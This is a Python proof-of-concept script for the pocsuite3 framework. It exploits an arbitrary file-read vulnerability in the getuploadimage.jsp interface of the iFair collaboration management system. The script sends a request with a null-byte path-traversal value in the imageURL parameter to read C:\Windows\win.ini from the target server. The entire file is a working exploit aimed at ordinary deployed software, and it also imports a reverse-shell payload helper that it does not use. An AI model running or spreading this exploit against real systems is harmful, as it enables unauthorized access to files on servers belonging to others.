# _*_ coding:utf-8 _*_
# @Time : 2024/1/21
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class ifair_fileread(POCBase):
    pocDesc = '''企语iFair协同管理系统getuploadimage.jsp接口存在任意文件读取'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-21'
    name = '企语iFair协同管理系统getuploadimage.jsp接口任意文件读取漏洞'


    def _verify(self):

        result = {}
        url = self.url+ '/oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%001.png'

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate Connection: keep-alive'
        }

        try:


            response = requests.post(url, headers=headers)
            if response.status_code == 200 and 'file' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(ifair_fileread)